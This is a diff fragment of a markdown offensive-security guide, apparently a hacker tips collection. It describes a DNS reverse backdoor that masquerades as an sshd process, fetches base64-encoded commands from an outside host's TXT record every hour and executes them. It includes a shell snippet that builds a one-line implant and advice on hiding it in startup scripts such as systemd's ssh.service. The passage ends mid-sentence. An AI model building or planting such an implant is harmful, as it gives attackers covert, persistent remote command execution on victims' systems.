@@ -1873,9 +1873,9 @@ An elaborate DNS reverse backdoor (as a daemon and living-off-the-land):
 - Depends on bash, dig and base64 only.
 - Hides as `sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups`
 - Requests a DNS TXT record every 60 minutes (from b00m2.team-teso.net).
-- Base64-decodes the TXT record and executes the command on the target.
+- Base64-decodes the TXT record and executes the command on the target. (the test command creates /tmp/.b00m).
 
-1. Modify the following to your liking and then Cut & Paste it to generate the 1-line implant. 
+1. Modify the following to your liking and then Cut & Paste it to generate the 1-line implant.
 
 ```shell
 base64 -w0 >x.txt <<-'EOF'
@@ -1892,6 +1892,7 @@ while :; do
 done'|exec -a "$P" bash &) &>/dev/null
 EOF
 echo "===> Execute the following on the target:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
+rm -f x.txt
 ```
 
 2. Add this 1-line implant to any startup script on the target (e.g. to [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=` in */usr/lib/systemd/system/ssh.service*). An clever example for ssh.service:
